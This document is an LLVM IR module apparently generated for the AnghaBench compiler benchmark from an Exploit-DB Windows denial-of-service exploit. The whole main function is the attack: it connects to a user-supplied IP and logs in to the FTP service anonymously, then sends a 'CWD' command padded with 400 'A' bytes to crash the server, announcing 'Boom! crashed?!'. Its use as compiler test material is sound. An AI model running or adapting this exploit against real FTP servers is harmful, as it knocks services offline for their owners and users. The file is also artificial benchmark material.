; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_3331.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_3331.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, %struct.TYPE_3__, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [16 x i8] c"Usage: %s <ip>\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@s = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"error with socket\0A\00", align 1
@sock_addr = common dso_local global %struct.TYPE_4__ zeroinitializer, align 4
@PORT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [19 x i8] c"unable to connect\0A\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"[+] Connected\0A\00", align 1
@recvbuf = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [21 x i8] c"[+] Sending user...\0A\00", align 1
@.str.5 = private unnamed_addr constant [17 x i8] c"USER anonymous\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [21 x i8] c"unable to send data\0A\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c"[+] Sending pass...\0A\00", align 1
@.str.8 = private unnamed_addr constant [17 x i8] c"PASS anonymous\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [24 x i8] c"[+] Building payload. \0A\00", align 1
@pwn = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [5 x i8] c"CWD \00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.12 = private unnamed_addr constant [22 x i8] c"[+] Sending payload.\0A\00", align 1
@.str.13 = private unnamed_addr constant [21 x i8] c"[!] Boom! crashed?!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [50 x i8], align 16
  %7 = alloca [50 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %8, 2
  br i1 %9, label %10, label %15

10:                                               ; preds = %2
  %11 = load i8**, i8*** %5, align 8
  %12 = getelementptr inbounds i8*, i8** %11, i64 0
  %13 = load i8*, i8** %12, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0), i8* %13)
  store i32 1, i32* %3, align 4
  br label %99

15:                                               ; preds = %2
  %16 = load i32, i32* @AF_INET, align 4
  %17 = load i32, i32* @SOCK_STREAM, align 4
  %18 = load i32, i32* @IPPROTO_TCP, align 4
  %19 = call i32 @socket(i32 %16, i32 %17, i32 %18)
  store i32 %19, i32* @s, align 4
  %20 = icmp slt i32 %19, 0
  br i1 %20, label %21, label %23

21:                                               ; preds = %15
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %99

23:                                               ; preds = %15
  %24 = load i32, i32* @AF_INET, align 4
  store i32 %24, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @sock_addr, i32 0, i32 2), align 4
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @inet_addr(i8* %27)
  store i32 %28, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @sock_addr, i32 0, i32 1, i32 0), align 4
  %29 = load i32, i32* @PORT, align 4
  %30 = call i32 @htons(i32 %29)
  store i32 %30, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @sock_addr, i32 0, i32 0), align 4
  %31 = load i32, i32* @s, align 4
  %32 = call i32 @connect(i32 %31, %struct.sockaddr* bitcast (%struct.TYPE_4__* @sock_addr to %struct.sockaddr*), i32 4)
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %36

34:                                               ; preds = %23
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %99

36:                                               ; preds = %23
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  %38 = load i8*, i8** @recvbuf, align 8
  %39 = call i32 @memset(i8* %38, i8 signext 0, i32 1024)
  %40 = load i32, i32* @s, align 4
  %41 = load i8*, i8** @recvbuf, align 8
  %42 = call i32 @recv(i32 %40, i8* %41, i32 1024, i32 0)
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %44 = getelementptr inbounds [50 x i8], [50 x i8]* %6, i64 0, i64 0
  %45 = call i32 @memset(i8* %44, i8 signext 0, i32 50)
  %46 = getelementptr inbounds [50 x i8], [50 x i8]* %6, i64 0, i64 0
  %47 = call i32 @memcpy(i8* %46, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0), i32 18)
  %48 = load i32, i32* @s, align 4
  %49 = getelementptr inbounds [50 x i8], [50 x i8]* %6, i64 0, i64 0
  %50 = getelementptr inbounds [50 x i8], [50 x i8]* %6, i64 0, i64 0
  %51 = call i32 @strlen(i8* %50)
  %52 = call i32 @send(i32 %48, i8* %49, i32 %51, i32 0)
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %56

54:                                               ; preds = %36
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %99

56:                                               ; preds = %36
  %57 = load i8*, i8** @recvbuf, align 8
  %58 = call i32 @memset(i8* %57, i8 signext 0, i32 1024)
  %59 = load i32, i32* @s, align 4
  %60 = load i8*, i8** @recvbuf, align 8
  %61 = call i32 @recv(i32 %59, i8* %60, i32 1024, i32 0)
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0))
  %63 = getelementptr inbounds [50 x i8], [50 x i8]* %7, i64 0, i64 0
  %64 = call i32 @memcpy(i8* %63, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0), i32 18)
  %65 = load i32, i32* @s, align 4
  %66 = getelementptr inbounds [50 x i8], [50 x i8]* %7, i64 0, i64 0
  %67 = getelementptr inbounds [50 x i8], [50 x i8]* %7, i64 0, i64 0
  %68 = call i32 @strlen(i8* %67)
  %69 = call i32 @send(i32 %65, i8* %66, i32 %68, i32 0)
  %70 = icmp eq i32 %69, -1
  br i1 %70, label %71, label %73

71:                                               ; preds = %56
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %99

73:                                               ; preds = %56
  %74 = load i32, i32* @s, align 4
  %75 = load i8*, i8** @recvbuf, align 8
  %76 = call i32 @recv(i32 %74, i8* %75, i32 1024, i32 0)
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.9, i64 0, i64 0))
  %78 = load i8*, i8** @pwn, align 8
  %79 = call i32 @memset(i8* %78, i8 signext 0, i32 450)
  %80 = load i8*, i8** @pwn, align 8
  %81 = call i32 @memcpy(i8* %80, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 4)
  %82 = load i8*, i8** @pwn, align 8
  %83 = getelementptr inbounds i8, i8* %82, i64 4
  %84 = call i32 @memset(i8* %83, i8 signext 65, i32 400)
  %85 = load i8*, i8** @pwn, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 404
  %87 = call i32 @memcpy(i8* %86, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i32 2)
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.12, i64 0, i64 0))
  %89 = load i32, i32* @s, align 4
  %90 = load i8*, i8** @pwn, align 8
  %91 = load i8*, i8** @pwn, align 8
  %92 = call i32 @strlen(i8* %91)
  %93 = call i32 @send(i32 %89, i8* %90, i32 %92, i32 0)
  %94 = icmp eq i32 %93, -1
  br i1 %94, label %95, label %97

95:                                               ; preds = %73
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %99

97:                                               ; preds = %73
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.13, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %99

99:                                               ; preds = %97, %95, %71, %54, %34, %21, %10
  %100 = load i32, i32* %3, align 4
  ret i32 %100
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
